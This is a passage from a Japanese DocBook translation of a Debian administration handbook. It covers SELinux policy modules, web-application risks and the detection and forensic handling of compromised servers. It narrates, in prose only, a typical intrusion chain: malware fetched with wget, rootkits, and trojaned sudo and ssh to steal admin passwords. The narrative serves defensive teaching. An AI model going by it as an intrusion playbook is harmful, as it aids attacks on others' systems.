allow myapp_t myapp_tmp_t:file manage_file_perms;
files_tmp_filetrans(myapp_t,myapp_tmp_t,file)</programlisting>
        <calloutlist>
          <callout arearefs="example.te.module">
	    <para>モジュールは名前とバージョン番号で識別されます。policy_module マクロは必須です。</para>
          </callout>
          <callout arearefs="example.te.type">
	    <para>モジュールによって新しい SELinux タイプが導入される場合、type 文を使って新しい SELinux タイプを必ず宣言してください。多くの無駄な権限を与えるのでなく、必要な SELinux タイプをすべて作成してください。遠慮はいりません。</para>
          </callout>
          <callout arearefs="example.te.domain">
	    <para>ここでは <literal>domain_type</literal> および <literal>domain_entry_file</literal> インターフェースを使って、<literal>myapp_exec_t</literal> とラベリングされた実行ファイルによって使われるプロセスの SELinux ドメインとして <literal>myapp_t</literal> SELinux タイプを定義しています。こうすることで、暗黙のうちにオブジェクトに <literal>exec_type</literal> 属性が追加されます。このおかげで、他のモジュールは <literal>myapp_exec_t</literal> とラベリングされたプログラムを実行する権限を取得することが可能になります。たとえば <literal>userdomain</literal> モジュールを使うことで、<literal>user_t</literal>、<literal>staff_t</literal>、<literal>sysadm_t</literal> SELinux ドメインを持つプロセスが自分を実行することが可能になります。他の閉じ込められたアプリケーションの SELinux ドメインは、その SELinux ドメインに割り当てられたルールが同様の権限を取得しない限り (たとえば <literal>dpkg_t</literal> SELinux ドメインを持つ <command>dpkg</command> がこの場合に相当します)、<literal>myapp_exec_t</literal> とラベリングされたプログラムを実行する権限を持ちません。</para>
          </callout>
          <callout arearefs="example.te.interface">
	    <para><literal>logging_log_file</literal> はリファレンスポリシーによって提供されるインターフェースです。これは指定された SELinux タイプでラベリングされたファイルはその SELinux タイプに対応するルールから恩恵を受ける義務があるログファイルであることを表します (たとえば、<command>logrotate</command> がログファイルを処理することを可能にするために、<command>logrotate</command> に権限を与える場合に使います)。</para>
          </callout>
          <callout arearefs="example.te.allow">
	    <para><literal>allow</literal> 指示文は操作を許可するために使われる基本的な指示文です。1 番目のパラメータはこの操作を実行することを許されたプロセスの SELinux ドメインです。2 番目のパラメータは 1 番目のパラメータで指定した SELinux ドメインのプロセスが操作することが可能なオブジェクトを定義します。2 番目のパラメータは「<replaceable>type</replaceable>:<replaceable>class</replaceable>」の形で定義します。ここで <replaceable>type</replaceable> は SELinux タイプで <replaceable>class</replaceable> はオブジェクトの種類 (ファイル、ディレクトリ、ソケット、名前付きパイプなど) です。最後に、3 番目のパラメータはパーミッション (許可された操作) を表現します。</para>

	    <para>パーミッションは許可された操作の一式として定義され、以下のテンプレートに従います。すなわち <literal>{ <replaceable>operation1</replaceable> <replaceable>operation2</replaceable> }</literal> です。しかしながら、最も役に立つパーミッションを表すマクロを使うことも可能です。<filename>/usr/share/selinux/devel/include/support/obj_perm_sets.spt</filename> には、最も役に立つパーミッションのマクロが説明されています。</para>

	    <para>以下のウェブページでは、オブジェクトクラスと与えられるパーミッションの比較的包括的なリストが載せられています。<ulink type="block" url="http://www.selinuxproject.org/page/ObjectClassesPerms" /></para>
          </callout>
        </calloutlist>

	<para>さらに、対象のアプリケーションやサービスが正しく動くために必要な最低限のルールセットを見つけ出さなければいけません。これを行うには、アプリケーションの動作方法とアプリケーションが管理および生成するデータの種類に関する詳しい知識が必要です。</para>

	<para>しかしながら、経験的なアプローチが使えます。対応するオブジェクトに対する正しいラベリングが終わっていれば、アプリケーションを permissive モードで使うことが可能です。そして permissive モードでは、禁止されるであろう操作はログ記録されて実行されます。このログを解析することで、許可する操作を識別することが可能になります。以下は permissive モードでアプリケーションを動かした場合に記録されるログエントリの例です。</para>

        <programlisting>avc:  denied  { read write } for  pid=1876 comm="syslogd" name="xconsole" dev=tmpfs ino=5510 scontext=system_u:system_r:syslogd_t:s0 tcontext=system_u:object_r:device_t:s0 tclass=fifo_file permissive=1</programlisting>

	<para>このメッセージをより詳しく理解するために、それぞれの要素について勉強しましょう。</para>

        <table colsep="1">
          <title>SELinux ログエントリの解析</title>
          <tgroup cols="2">
            <thead>
              <row>
                <entry>メッセージ</entry>
                <entry>説明</entry>
              </row>
            </thead>
            <tbody>
              <row>
                <entry><computeroutput>avc: denied</computeroutput></entry>
                <entry>操作が拒否されました。</entry>
              </row>
              <row>
                <entry><computeroutput>{ read write }</computeroutput></entry>
                <entry>この操作には <literal>read</literal> と <literal>write</literal> パーミッションが必要です。</entry>
              </row>
              <row>
                <entry><computeroutput>pid=1876</computeroutput></entry>
                <entry>PID 1876 のプロセスがこの操作を実行しました (または実行を試行しました)。</entry>
              </row>
              <row>
                <entry><computeroutput>comm="syslogd"</computeroutput></entry>
                <entry>プロセスは <literal>syslogd</literal> プログラムのインスタンスです。</entry>
              </row>
              <row>
                <entry><computeroutput>name="xconsole"</computeroutput></entry>
                <entry>対象のオブジェクトは <literal>xconsole</literal> と名付けられました。場合によってはこれの代わりにフルパスを含む「path」変数が設定されていることもあります。</entry>
              </row>
              <row>
                <entry><computeroutput>dev=tmpfs</computeroutput></entry>
                <entry>対象のオブジェクトをホストしているデバイスは <literal>tmpfs</literal> (メモリ内ファイルシステム) です。実ディスクの場合、オブジェクトをホストしているパーティション (たとえば「sda3」) になります。</entry>
              </row>
              <row>
                <entry><computeroutput>ino=5510</computeroutput></entry>
                <entry>オブジェクトは inode 番号 5510 で識別されています。</entry>
              </row>
              <row>
                <entry><computeroutput>scontext=system_u:system_r:syslogd_t:s0</computeroutput></entry>
                <entry>これは操作を実行したプロセスのセキュリティコンテキストです。</entry>
              </row>
              <row>
                <entry><computeroutput>tcontext=system_u:object_r:device_t:s0</computeroutput></entry>
                <entry>これは対象オブジェクトのセキュリティコンテキストです。</entry>
              </row>
              <row>
                <entry><computeroutput>tclass=fifo_file</computeroutput></entry>
                <entry>対象オブジェクトは FIFO ファイルです。</entry>
              </row>
            </tbody>
          </tgroup>
        </table>

	<para>SELinux ログエントリを観察することで、その操作を許可するために必要なルールを構築することが可能です。たとえば例に挙げた操作を許可するルールは <literal>allow syslogd_t device_t:fifo_file { read write }</literal> のようになります。この作業は自動化することが可能です。これが <command>audit2allow</command> コマンド (<emphasis role="pkg">policycoreutils</emphasis> パッケージに含まれます) の役割です。設定する必要のある内容に応じてさまざまなオブジェクトが既に正しくラベリングされている場合にのみ、このアプローチは役に立ちます。いずれにせよ、管理者は必ず生成されたルールを注意深く確認し、アプリケーションに対する知識に基づいてルールの妥当性を検査しなければいけません。事実上、このアプローチはアプリケーションが本当に必要としている権限よりも多くの権限を与えようとします。ほとんどの場合、新しい SELinux タイプを作成し、作成した SELinux タイプだけに権限を与えることが適切な解決策と言えます。また、拒否された操作がアプリケーションにとって致命的でない場合もあります。この場合、「<literal>dontaudit</literal>」ルールを追加するだけに留めることがより良い解決策かもしれません。こうすることで、実際の実行を拒否するのではなくログエントリの記録だけが拒否されます。</para>

        <sidebar>
          <title><emphasis>COMPLEMENTS</emphasis> SELinux ロールを設定されていないポリシールール</title>
          <indexterm><primary>Type Enforcement</primary></indexterm>
          <indexterm><primary>強制、Type Enforcement</primary></indexterm>

	  <para>新しいルールを作成した際に、SELinux ロールが 1 つも設定されていないことは不思議に見えるかもしれません。SELinux は許されている操作の見つかった SELinux ドメインだけを使います。SELinux ロールはユーザが他の SELinux ドメインに切り替えることを許可することで間接的に権限処理に介在するだけです。SELinux は <emphasis>Type Enforcement</emphasis> として知られる理論に基づいており、権限を獲得する際に考慮される要素は SELinux タイプだけです。</para>
        </sidebar>
      </section>
      <section>
        <title>ファイルのコンパイル</title>

	<para>3 個のファイル (<filename>example.if</filename>、<filename>example.fc</filename>、<filename>example.te</filename>) が新しいルールに関する管理者の期待と一致したら、<command>make NAME=devel</command> を実行して <filename>example.pp</filename> ファイルの形でモジュールを生成します (<command>semodule -i example.pp</command> を使ってすぐさまこのモジュールをインストールすることが可能です)。複数のモジュールを定義した場合、<command>make</command> はすべての対応する <filename>.pp</filename> ファイルを生成します。</para>
      </section>
    </section>
  </section>
  <section id="sect.other-security-considerations">
    <title>セキュリティ関連で他に考慮すべき点</title>

    <para>セキュリティとは単なる技術的問題ではありません。セキュリティに関して最も重要なことは十分に実践したり、危険を理解したりすることです。この節では、いくつかのより一般的な危険および最良の実践例を見直します。ここで挙げた事例を実践することで、セキュリティを向上させたり、攻撃が成功してもその影響を小さなものにしたりすることが可能です。</para>
    <section>
      <title>ウェブアプリケーションの持つ潜在的危険性</title>

      <para>ウェブアプリケーションはその普遍的特徴のおかげで広く使われています。いくつかのウェブアプリケーションは同時に実行されます。たとえばウェブメール、wiki、グループウェアシステム、フォーラム、写真ギャラリー、ブログなどは同時に実行されます。これらのウェブアプリケーションは「LAMP」(<emphasis>Linux、Apache、MySQL、PHP</emphasis>) スタックに頼っています。残念なことに、多くのウェブアプリケーションがセキュリティ問題を深く考えずに書かれています。外部から提供されるデータは、その妥当性を少しだけ検査するか、全く検査せずに使わることが多いです。特別に細工した値をアプリケーションに渡すことで、あるコマンドの代わりに他のコマンドを実行させることが可能です。最も自明な問題の多くは時間がたてば修正されますが、定期的に新しいセキュリティ問題が生じます。</para>

      <sidebar>
        <title><emphasis>VOCABULARY</emphasis> SQL インジェクション</title>

	<para>プログラムが安全性に欠けるやり方で SQL クエリにデータを挿入している場合、プログラムは SQL インジェクションに対して脆弱になります。SQL インジェクションとは、パラメータを変更することで、プログラムが実行する実際のクエリを意図しないものに変える行為を指します。SQL インジェクションによりデータベースが破壊されたり、通常は利用できないデータへのアクセスが可能になります。<ulink type="block" url="http://en.wikipedia.org/wiki/SQL_Injection" /></para>
        <indexterm><primary>SQL インジェクション</primary></indexterm>
      </sidebar>

      <para>このため、定期的なウェブアプリケーションの更新は不可欠です。これにはクラッカー (プロフェッショナルな攻撃者であるかスクリプトキディであるかに関わらず) からの既知の脆弱性を利用した攻撃を防ぐという意味合いがあります。実際のリスクは場合によりますが、データの破壊、任意のコード実行、ウェブサイトの書き換えなどの範囲におよびます。</para>
    </section>
    <section>
      <title>予測される結果を知る</title>

      <para>ウェブアプリケーションの持つ脆弱性はクラッキング行為の足掛かりとして使われることが多いです。以下では、そこから考えられる結果の短い概観を示します。</para>

      <sidebar>
        <title><emphasis>QUICK LOOK</emphasis> HTTP クエリのフィルタ</title>

	<para>Apache 2 には、入って来る HTTP クエリをフィルタするモジュールが含まれています。このモジュールを使うことで、いくつかの攻撃ベクトルを妨害することが可能です。たとえば、パラメータの長さに制限を設けることで、バッファオーバーフローを避けることが可能です。より一般的に言えば、ウェブアプリケーションにパラメータを渡す前にパラメータの妥当性を検査させ、多くの基準に従ってアクセス制限を加えることが可能です。さらにこれを動的なファイアウォールの更新に統合することが可能です。こうすることで、ルールを破ったクライアントは指定された期間ウェブサーバへのアクセスを禁止されることになります。</para>

	<para>この種のフィルタを設定することは長く厄介な作業ですが、配備予定のウェブアプリケーションのセキュリティに関する実績が疑わしい場合に効果があります。</para>

	<para><emphasis>mod-security2</emphasis> (<emphasis role="pkg">libapache2-mod-security2</emphasis> パッケージに含まれます) はこの機能を提供する主要なモジュールです。<emphasis>mod-security2</emphasis> には簡単に有効化できる専用のすぐに使える数多くのルールが含まれます (<emphasis role="pkg">modsecurity-crs</emphasis> パッケージに含まれます)。</para>
        <indexterm><primary><emphasis role="pkg">libapache-mod-security</emphasis></primary></indexterm>
        <indexterm><primary><emphasis>mod-security</emphasis></primary></indexterm>
      </sidebar>

      <para>不正侵入に成功した後にどのようなことが行われるかは攻撃者のやる気に依存します。<emphasis>スクリプトキディ</emphasis>はウェブサイトで探し出したレシピを適用するだけです。そしてほとんどの場合、<emphasis>スクリプトキディ</emphasis>は攻撃先のウェブページを書き換えるかデータを削除するかします。さらに悪賢い<emphasis>スクリプトキディ</emphasis>はサーチエンジンでより高い順位に自分のサイトを表示させるために攻撃先のウェブページに不可視の内容を追加します。</para>

      <para>さらに上級の攻撃者はこれ以上のことを行います。最悪の筋書きは以下の手順で進みます。すなわち、攻撃者は <literal>www-data</literal> ユーザ権限でコマンドを実行する能力を取得しますが、コマンドを実行するには数多くの操作を必要とします。作業を簡単に行うために、攻撃者はさらに別のウェブアプリケーションをインストールします。ここでインストールされるウェブアプリケーションはさまざまなコマンド (ファイルシステムの閲覧、パーミッションの検査、ファイルのアップロードおよびダウンロードなど) のリモート実行およびネットワークシェルの提供に特化して設計されています。しばしば、脆弱性を使うことで <command>wget</command> コマンドを使ってマルウェアを <filename>/tmp/</filename> にダウンロードし、マルウェアを実行することが可能になります。このマルウェアは既に不正侵入されている別のウェブサイトからダウンロードされます。こうすることで攻撃者の痕跡がなくなり、本当の攻撃元に関するヒントを調査することが難しくなります。</para>

      <para>この時点で、攻撃者は IRC <emphasis>ボット</emphasis> (IRC サーバに接続してチャンネルから操作されるロボット) をインストールできる程度の権限を取得しています。この IRC ボットは非合法ファイル (映画やソフトウェアなどの無断コピー) を共有するために使われることが多いです。意欲的な攻撃者はさらに先へ行きます。<literal>www-data</literal> アカウントはマシンに対する完全なアクセスを許されていないので、攻撃者は管理者権限を取得しようとするでしょう。今現在、これは不可能であるべきです。しかし、ウェブアプリケーションが最新の状態でなければ、おそらくカーネルやその他のプログラムも古いことでしょう。これはしばしばローカルユーザがいないため脆弱性に関して知っているにも関わらずシステムのアップグレードを無視している管理者の判断です。攻撃者はこの 2 番目の脆弱性に乗じて root アクセスを取得します。</para>

      <sidebar>
        <title><emphasis>VOCABULARY</emphasis> 特権昇格</title>

	<para>特権昇格という用語は通常ユーザに与えられていないより高位のパーミッションを取得するために使われる操作のすべてを意味しています。<command>sudo</command> プログラムはまさにユーザに指定した管理者権限を与える目的で設計されました。しかし、同じ用語を使って不当な権限を取得するために脆弱性を活用する攻撃者の振る舞いを表すこともあります。</para>
      </sidebar>

      <para>これで、攻撃者はマシンを自らのコントロール下に置くことができました。通常、攻撃者はこの特権アクセスを可能な限り長く維持しようとします。そのために攻撃者は <emphasis>rootkit</emphasis> をインストールします。<emphasis>rootkit</emphasis> とは後から攻撃者が管理者権限を取得することを可能にするためにいくつかのシステムの要素を置き替えるプログラムです。さらに rootkit は自分の存在および侵入の形跡を隠そうともします。改竄された <command>ps</command> プログラムはいくつかのプロセスを無視するでしょうし、改竄された <command>netstat</command> はいくつかの活動中の接続を表示しないでしょう。攻撃者は root 権限を使うことでシステム全体を観察することが可能でしたが、重要なデータは見つかりませんでした。そこで攻撃者はさらに同じネットワーク内の他のマシンにアクセスしようとするでしょう。管理者アカウントと履歴ファイルを解析することで、攻撃者は日常的にアクセスしているマシンを見つけ出します。<command>sudo</command> や <command>ssh</command> を改竄されたプログラムで置き換えることにより、攻撃者は管理者パスワードを横取りすることが可能です。攻撃者はここで横取りした管理者パスワードを検出されたサーバで使い、さらに侵入を進めます。</para>

      <para>ここで述べた最悪の筋書きはいくつかの取り組みによって避けることが可能です。以降の節では、その取り組みについて説明します。</para>
    </section>
    <section id="sect.choosing-the-software-wisely">
      <title>賢い方法でソフトウェアを選ぶ</title>

      <para>潜在的なセキュリティ問題が知られると、管理者はサービスを配備するプロセスの各段階 (特にインストールするソフトウェアを選ぶ際) でこのセキュリティ問題に気を配らなければいけません。<literal>SecurityFocus.com</literal> などの多くのウェブサイトが最近発見された脆弱性のリストを管理しています。このおかげで、特定のソフトウェアを配備する前にそのソフトウェアのセキュリティ実績の情報を得ることが可能です。もちろん、この情報はそのソフトウェアの人気に比例しています。すなわち、広く使われているプログラムほど標的にされ、結果として注意深く検査されます。逆に、セキュリティ監査に対する関心が欠如していたために、特定分野のプログラムはまだ公表されていない数多くのセキュリティホールを隠しているかもしれません。</para>

      <sidebar>
        <title><emphasis>VOCABULARY</emphasis> セキュリティ監査</title>

	<para>セキュリティ監査とはソフトウェアが持つ潜在的なセキュリティ脆弱性を探すためにあるソフトウェアのソースコードを徹底的に読んだり解析することを言います。通常セキュリティ監査は積極的な行動であり、プログラムがある種のセキュリティ要件を満足していることを保証するために行われます。</para>
      </sidebar>

      <para>通常フリーソフトウェア世界には多くの選択肢があります。そして、ソフトウェアは現場で適用する基準と同じ選択基準に従い決定するべきです。多くの機能を備えるということは、コードに隠された脆弱性の危険性を増加させることを意味します。そして実際、あるタスクに関する最も先進的なプログラムを選ぶことは逆効果となる可能性があり、要求を満足する最も単純なプログラムを選ぶことのほうがより良い選択と言えるでしょう。</para>

      <sidebar>
        <title><emphasis>VOCABULARY</emphasis> ゼロデイ脆弱性</title>

	<para><emphasis>ゼロデイ脆弱性</emphasis>攻撃は防ぐことが難しいです。さらにこの用語は対象プログラムの開発者がまだ知らない脆弱性の意味も持っています。</para>
      </sidebar>
    </section>
    <section id="sect.managing-a-machine-as-a-whole">
      <title>マシン全体の管理</title>

      <para>多くの Linux ディストリビューションはデフォルトで多数の Unix サービスと多くのツールをインストールします。多くの場合、デフォルトでインストールされるサービスとツールは管理者がマシンをセットアップする本来の目的に必要なものではありません。セキュリティには一般的な指針があり、それは不要なソフトウェアをアンインストールすることが最良の選択であるという指針です。実際、もし FTP サーバ以外の未使用のサービスに含まれる脆弱性を使ってマシン全体の管理者権限が取得される可能性があるのなら、FTP サーバを守ることに意味はありません。</para>

      <para>同様の理由で、通常ファイアウォールは公開アクセスされる予定のサービスへのアクセスだけを許可するように設定されます。</para>

      <para>現在のコンピュータは複数のサービスを 1 台の物理マシン上でホストできる程度に十分強力です。財政的な観点からすると、この可能性は興味深いものです。なぜなら、管理するコンピュータの台数を 1 台で済ませたり、エネルギー消費量を減らしたりすることが可能だからです。しかしながら、セキュリティの観点からすると、このやり方には問題があります。1 つのサービスが不正侵入を受けるだけでマシン全体にアクセスできるようになり、さらに同じコンピュータ上でホストされている他のサービスも不正侵入を受けます。サービスを隔離することでこのリスクを緩和することが可能です。サービスを隔離するには、仮想化 (各サービスを専用の仮想マシンやコンテナでホストさせる) や AppArmor/SELinux (それぞれのサービスデーモンに適切に設計された一連のパーミッションを設定する) を使います。</para>
    </section>
    <section id="sect.users-are-players">
      <title>内部ユーザからの保護</title>

      <para>セキュリティに関する議論と言えばすぐに、インターネットの無法地帯に隠れた匿名のクラッカーによる攻撃に対する保護を思い浮かべることでしょう。しかし忘れられがちですが、内部にもリスク源が存在します。具体的に言えば、退職を控えている雇用者は重要なプロジェクトの機密ファイルをダウンロードしてこれを競争相手に売ることが可能です。不注意なセールスマンは新しい顧客とのミーティング中にセッションをロックせずに離席します。不器用なユーザは誤って間違ったディレクトリを削除します。</para>

      <para>これらのリスクは技術的に解決できます。つまり、最低限必要な権限よりも高位の権限をユーザに与えるべきではありませんし、定期的なバックアップは必ず必要です。しかし多くの場合、リスクを避けるためにユーザを教育することがより適切なやり方と言えるでしょう。</para>

      <sidebar>
        <title><emphasis>QUICK LOOK</emphasis> <emphasis role="pkg">autolog</emphasis></title>

	<para><emphasis role="pkg">autolog</emphasis> パッケージを使うことで、設定可能な遅延時間の後、活動していないユーザからの接続を自動的に切断することが可能です。また、セッションの終了した後に残っているユーザプロセスを kill することが可能です。これにより、ユーザがデーモンを実行することを避けることが可能です。</para>
      </sidebar>
    </section>
    <section id="sect.physical-security">
      <title>物理セキュリティ</title>

      <para>コンピュータ本体が保護されていなければ、サービスとネットワークの保護は無意味です。重要なデータは RAID アレイ内のホットスワップ対応のハードディスクに保存するだけの価値があります。なぜならハードディスクは壊れるものですし、データの可用性は不可欠だからです。しかし、ピザ配達人が建物に入って、サーバ部屋に忍び込んで、いくつかの選ばれたハードディスクを盗んで逃げることが可能な場合、セキュリティの重要な部分が満足されていません。誰がサーバ部屋に入れるのでしょうか? 入室と退室は監視されていますか? これらの質問は物理セキュリティを評価する際に考慮 (そして回答) に値します。</para>

      <para>物理セキュリティには、たとえば火事などの災害のリスクを考慮することも含まれます。災害という特別なリスクがあるために、バックアップメディアを別の建物か少なくとも防火金庫に保存することが正当化されます。</para>
    </section>
    <section>
      <title>法的責任</title>

      <para>管理者は程度の差はあれど暗黙のうちに自分の管理するユーザと一般のネットワークユーザから信頼されています。このため、ユーザは管理者に対して自分の過失が悪意ある人によって不正利用されることがないように自分を守ることを期待しています。</para>

      <para>あなたが管理しているマシンの制御を奪った攻撃者は、このマシンを前進基地 (「踏み台」として知られています) として使います。管理しているマシンから他の不正な活動を実行されることにより、あなたは法的な問題を被ることになります。なぜなら、攻撃された当事者にしてみれば、あなたのシステムが攻撃元に見えるため、あなたを攻撃者本人 (または共犯者) とみなすでしょう。多くの場合、攻撃者はスパムを送信するための中継サーバとしてあなたのサーバを使います。これは大きな影響をおよぼすものではありません (ブラックリストに登録されて、正規の電子メールを送信することに制限を受けるという潜在的な問題点を除きます)。とは言ってもこれは気持ちのよいものではありません。また別の場合、あなたのマシンはサービス拒否攻撃などのより重大な問題の要因になります。これはしばしば損失をもたらす場合があります。なぜなら、正規のサービスが利用できなくなり、データが破壊されるからです。さらに実質的な経費が掛かるという意味を持つ場合もあります。なぜなら、攻撃された当事者はあなたに対して法的手続きを開始するからです。すなわち、著作権で守られた著作物の認可されていない複製があなたのサーバから共有された場合、権利者はあなたに対して訴訟を起こすことが可能です。さらに、サービス水準合意を交わした他の企業があなたのマシンから攻撃を受けた場合に罰金を支払う契約になっている場合、彼らもあなたに対して訴訟を起こすことが可能です。</para>

      <para>これらの状況に陥ると、無罪を主張するだけでは通常十分ではありません。少なくとも、ある IP アドレスを経由してあなたのシステム上で行われた疑わしい活動に関する説得力のある証拠を提出する必要があります。この章の推奨を無視し、攻撃者に特権アカウント (特に root) へのアクセスの取得を許し、攻撃者が痕跡を消すために特権アカウントを使うことを許していれば、証拠の提出は不可能です。</para>
    </section>
  </section>
  <section id="sect.dealing-with-compromised-machine">
    <title>不正侵入されたマシンの取り扱い</title>

    <para>最良の心構えと注意深く設計されたセキュリティポリシーにも関わらず、結局のところ管理者は乗っ取りに直面します。この節では、不幸な状況に直面した場合の対応方法に関して、いくつかの指針を紹介します。</para>
    <section>
      <title>クラッカー不正侵入の検出と観察</title>

      <para>クラッキング対応の最初の段階はクラッキング行為を把握することです。クラッキング行為を特に十分な監視設備がない状態で把握することは不可能です。</para>

      <para>マシンでホストされている正規のサービスに直接的な影響をおよぼすまで (たとえば接続が遅くなったり、一部のユーザが接続できなくなったり、さまざまな誤作動が起きたりするまで)、クラッキング行為は気付かれないことが多いです。これらの問題に直面したら、管理者はマシンをよく見て不正行為を注意深く調べることが必要です。通常この時点で異常なプロセスが発見されます。たとえば標準的な <literal>/usr/sbin/apache2</literal> の代わりに <literal>apache</literal> と名付けられたプロセスなどが発見されます。この例に従うなら、やるべきことはプロセス ID を確認して、このプロセスによって現在実行されているプログラムの実体を確認するために <filename>/proc/<replaceable>pid</replaceable>/exe</filename> を確認することです。</para>

      <screen>
<computeroutput># </computeroutput><userinput>ls -al /proc/3719/exe</userinput>
<computeroutput>lrwxrwxrwx 1 www-data www-data 0 2007-04-20 16:19 /proc/3719/exe -&gt; /var/tmp/.bash_httpd/psybnc</computeroutput>
      </screen>

      <para>プログラムが <filename>/var/tmp/</filename> の下にインストールされ、ウェブサーバの権限で実行している? 間違いありません。マシンは不正侵入されています。</para>

      <para>これは一例に過ぎませんが、他にも管理者のアンテナに引っかかるような数多くの手掛かりが存在します。</para>
      <itemizedlist>
        <listitem>
	  <para>もはや動作しないはずのオプションを使っているコマンド。コマンドの主張するソフトウェアバージョンが <command>dpkg</command> によってインストールされたと考えられるバージョンと一致しない可能性があります。</para>
        </listitem>
        <listitem>
	  <para>最後の接続元が別の大陸にある未知のサーバということを示すコマンドプロンプトやセッション挨拶文。</para>
        </listitem>
        <listitem>
	  <para><filename>/tmp/</filename> パーティションが満杯になったことによるエラー。<filename>/tmp/</filename> パーティションが大量の映画の不正コピーで満杯になっている可能性があります。</para>
        </listitem>
        <listitem>
	  <para>などです。</para>
        </listitem>
      </itemizedlist>
    </section>
    <section>
      <title>サーバをオフラインにする</title>

      <para>クラッキングが最も派手に行われる場合を除けば、クラッキングはネットワーク経由で行われ、攻撃者は目標 (機密データへのアクセス、不正ファイルの共有、踏み台としてマシンを使うことによる本人識別情報の隠匿など) を達成するためにネットワークを必要とします。攻撃者がまだクラッキング行為を完了していないならば、ネットワークからコンピュータを切り離すことで攻撃者は目標を達成できなくなります。</para>

      <para>サーバが物理的にアクセスできなければ、コンピュータをネットワークから切り離すことは不可能です。サーバがホスティングプロバイダの物凄く遠くにあるデータセンターでホストされていたり、その他の理由でサーバにアクセスできない場合、いくつかの重要な情報の収集を開始して (<xref linkend="sect.keeping-everything-that-could-be-used-as-evidence" />、<xref linkend="sect.forensic-analysis" />、<xref linkend="sect.reconstituting-the-attack-scenario" />を参照してください)、可能な限り多くの (通常 <command>sshd</command> を除くすべての) サービスをシャットダウンすることで、可能な限りサーバを隔離することは通常良いアイディアです。これはまだ都合が悪い状態です。なぜなら、攻撃者は管理者がしているのと同様に SSH アクセスできるからです。このため、マシンを「きれいに」することは難しいです。</para>
    </section>
    <section id="sect.keeping-everything-that-could-be-used-as-evidence">
      <title>証拠として使えるすべての保存</title>

      <para>攻撃を理解したり攻撃者に対して法的手段を取ったりするには、すべての重要な要素の複製を取ることが必要です。ここで重要な要素にはハードディスクの内容、すべての実行中プロセスのリスト、すべての開かれた接続のリストなどが含まれます。RAM の内容が重要な要素に含められる場合もありますが、実際に RAM の内容が役に立つことはまれです。</para>

      <para>作業中に、管理者は不正侵入されたマシン上で数多くの事項を確認しようとします。しかし通常これは避けるべきです。すべてのコマンドは破壊されている可能性があり、さまざまな証拠を消してしまいます。管理者は最低限の確認 (ネットワーク接続状態を確認する <command>netstat -tupan</command>、プロセスのリストを確認する <command>ps auxf</command>、実行中プログラムのより詳しい情報を確認する <command>ls -alR /proc/[0-9]*</command>) だけを実行し、実行したすべての確認事項を注意深く記録するべきです。</para>

      <sidebar>
        <title><emphasis>CAUTION</emphasis> その場解析</title>

	<para>特にサーバが物理的にアクセスできない場合、起動中のシステムを解析したいと思うかもしれませんが、これは特に避けるべきです。なぜなら特に単純に言って、不正侵入されたシステムに現在インストールされているプログラムを信頼できないからです。破壊された <command>ps</command> コマンドが一部のプロセスを非表示にしたり、破壊された <command>ls</command> が一部のファイルを非表示にしたりする可能性は高いと言って良いでしょう。場合によってはカーネルに不正侵入されることすらあるのです!</para>

	<para>これでもまだその場解析が必要な場合、既知の良好なプログラムだけを使うように注意するべきです。これを行う良い方法は、破壊されていないプログラムが含まれるレスキュー CD または読み込み専用のネットワーク共有を使うことです。しかしながらカーネル自身が不正侵入されている場合、これらの対策方法では不十分な場合があります。</para>
      </sidebar>

      <para>「動的な」要素の保存が完了したら、次にハードディスクの完全なイメージを保存します。ファイルシステムの内容が書き変えられている最中に完全なイメージを作ることは不可能です。そのため、ファイルシステムを読み込み専用で再マウントする必要があります。最も簡単な解決策として、(<command>sync</command> を実行した後に) サーバを無理やり停止し、レスキュー CD を使って再起動することがよく行われます。各パーティションは <command>dd</command> などのツールを使ってコピーされるべきです。この種のイメージを他のサーバに送信することが可能です (場合によってはとても便利な <command>nc</command> ツールを使って送信します)。他のより簡単な方法もあります。その方法とは不正侵入されたマシンからディスクを取り出して、再フォーマットおよび再インストールしても問題ない新しいディスクで置き換える方法です。</para>
    </section>
    <section>
      <title>再インストール</title>
      <indexterm><primary>バックドア</primary></indexterm>

      <para>不正侵入されたサーバを完全に再インストールする前にオンラインに戻すべきではありません。深刻な不正侵入の場合 (管理者権限が奪われていた場合)、再インストール以外に攻撃者が残したすべて (特に<emphasis>バックドア</emphasis>) が一掃されたことを保証する方法はほぼ存在しません。もちろん、攻撃者の使う脆弱性をふさぐために、すべての最新のセキュリティ更新を適用しなければいけません。理想的に言えば、不正侵入の形跡を解析することで、この最新のセキュリティ更新によってふさがれる脆弱性を使って不正侵入が行われたことが明らかになるべきです。そうすれば、実際に攻撃ベクトルが修正されたことを保証することが可能です。しかしこれができなければ、更新によって不正侵入の足掛かりとなった脆弱性が修正されたことを期待することしかできません。</para>

      <para>リモートサーバの再インストールは常に簡単というわけではありません。ホスティング会社の手助けが必要になる場合もあります。なぜなら、ホスティング会社のすべてが自動再インストールシステムを提供しているとは限らないからです。不正侵入後に取られたバックアップからマシンを再インストールしないように注意してください。理想的に言えば、データだけを回復するべきです。実際のソフトウェアはインストールメディアから再インストールされるべきです。</para>
    </section>
    <section id="sect.forensic-analysis">
      <title>フォレンジック解析</title>

      <para>サービスが回復したら、攻撃ベクトルを理解するために不正侵入されたシステムのディスクイメージの詳細な調査を開始します。ディスクイメージをマウントする際に、<literal>ro,nodev,noexec,noatime</literal> オプションを使うことに注意してください。これは (ファイルにアクセスしたタイムスタンプを含めて) 内容の変更を防ぎ、誤って破壊されたプログラムを実行することを防ぐ意味合いがあります。</para>

      <para>通常、攻撃シナリオを追跡するには変更されて実行されたすべてを探し出すことが必要です。</para>
      <itemizedlist>
        <listitem>
	  <para><filename>.bash_history</filename> ファイルには、極めて興味深い内容が含まれます。</para>
        </listitem>
        <listitem>
	  <para>最近作成、修正、アクセスされたファイルの一覧にも極めて興味深い内容が含まれます。</para>
        </listitem>
        <listitem>
	  <para><command>strings</command> コマンドは攻撃者がインストールしたプログラムを識別する助けになります。<command>strings</command> コマンドはバイナリからテキスト文字列を抽出します。</para>
        </listitem>
        <listitem>
	  <para><filename>/var/log/</filename> 内のログファイルを使えば出来事の経過を追跡することが可能です。</para>
        </listitem>
        <listitem>
	  <para>特殊目的のツールを使うことで、削除された可能性のあるファイルすなわち攻撃者が削除することが多いログファイルなどの内容を復元することが可能です。</para>
        </listitem>
      </itemizedlist>

      <para>これらの操作は専用ソフトウェアを使うことで簡単に実行することが可能です。特に、<emphasis role="pkg">sleuthkit</emphasis> パッケージにはファイルシステムを解析する多くのツールが含まれます。<emphasis>Autopsy Forensic Browser</emphasis> グラフィカルインターフェース (<emphasis role="pkg">autopsy</emphasis> パッケージに含まれます) を使えば、これらのツールを簡単に使うことが可能です。</para>
